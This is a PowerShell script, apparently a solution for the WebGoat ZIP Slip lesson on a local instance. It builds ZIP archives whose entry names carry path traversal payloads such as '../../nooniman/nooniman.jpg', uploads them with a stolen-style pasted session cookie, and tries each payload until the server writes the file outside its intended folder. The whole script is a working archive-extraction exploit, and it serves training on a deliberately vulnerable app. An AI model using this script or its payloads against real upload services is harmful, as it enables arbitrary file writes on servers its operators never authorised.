# Path Traversal - ZIP Slip Attack

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Path Traversal - ZIP Slip" -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "Paste JSESSIONID:" -ForegroundColor White
$sessionId = Read-Host

$webSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$cookie = New-Object System.Net.Cookie("JSESSIONID", $sessionId, "/", "localhost")
$webSession.Cookies.Add("http://localhost:8001", $cookie)

$url = "http://localhost:8001/WebGoat/PathTraversal/zip-slip"

# Target: C:\Users\mahad/.webgoat-2025.3/PathTraversal/nooniman/nooniman.jpg
Write-Host ""
Write-Host "Creating malicious ZIP file..." -ForegroundColor Cyan

# Create the image file
$imagePath = "C:\Users\mahad\scripts\nooniman.jpg"
Invoke-WebRequest -Uri "http://localhost:8001/WebGoat/images/account.png" -OutFile $imagePath -UseBasicParsing

if (-not (Test-Path $imagePath)) {
    Write-Host "Failed to download image from WebGoat" -ForegroundColor Red
    exit 1
}

Write-Host "Downloaded nooniman.jpg" -ForegroundColor Green

# Create ZIP with path traversal
$zipPath = "C:\Users\mahad\scripts\profile.zip"

# Remove old ZIP if exists
if (Test-Path $zipPath) {
    Remove-Item $zipPath -Force
}

# Try different path traversal payloads in ZIP
$payloads = @(
    "../../../PathTraversal/nooniman/nooniman.jpg",
    "../../nooniman/nooniman.jpg",
    "../nooniman/nooniman.jpg",
    "..\..\nooniman\nooniman.jpg",
    "..\nooniman\nooniman.jpg"
)

foreach ($payload in $payloads) {
    Write-Host "`nTrying payload: $payload" -ForegroundColor Yellow
    
    # Create ZIP with path traversal using .NET
    Add-Type -Assembly System.IO.Compression.FileSystem
    
    if (Test-Path $zipPath) {
        Remove-Item $zipPath -Force
    }
    
    $zip = [System.IO.Compression.ZipFile]::Open($zipPath, 'Create')
    $entry = [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, $imagePath, $payload)
    $zip.Dispose()
    
    Write-Host "Created ZIP with entry: $payload" -ForegroundColor Cyan
    
    try {
        # Upload the ZIP
        $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
        $fileContent = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes)
        
        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"
        
        $bodyLines = @(
            "--$boundary",
            "Content-Disposition: form-data; name=`"uploadedFile`"; filename=`"profile.zip`"",
            "Content-Type: application/zip$LF",
            $fileContent,
            "--$boundary",
            "Content-Disposition: form-data; name=`"fullName`"$LF",
            "test",
            "--$boundary",
            "Content-Disposition: form-data; name=`"email`"$LF",
            "test@test.com",
            "--$boundary",
            "Content-Disposition: form-data; name=`"password`"$LF",
            "test",
            "--$boundary--$LF"
        )
        
        $body = $bodyLines -join $LF
        
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $body -WebSession $webSession -ContentType "multipart/form-data; boundary=$boundary"
        
        if ($response.lessonCompleted -eq $true) {
            Write-Host "SUCCESS!" -ForegroundColor Green
            Write-Host "Feedback: $($response.feedback)" -ForegroundColor White
            Write-Host ""
            Write-Host "Working payload: $payload" -ForegroundColor Green
            
            # Check if file was created
            $targetPath = "C:\Users\mahad\.webgoat-2025.3\PathTraversal\nooniman\nooniman.jpg"
            if (Test-Path $targetPath) {
                Write-Host "File successfully created at: $targetPath" -ForegroundColor Green
            }
            
            # Cleanup
            Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
            Remove-Item $imagePath -Force -ErrorAction SilentlyContinue
            exit 0
        } else {
            Write-Host "  Failed: $($response.feedback)" -ForegroundColor Red
        }
    } catch {
        Write-Host "  Error: $($_.Exception.Message)" -ForegroundColor Red
    }
}

Write-Host ""
Write-Host "None of the payloads worked." -ForegroundColor Red

# Cleanup
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
Remove-Item $imagePath -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
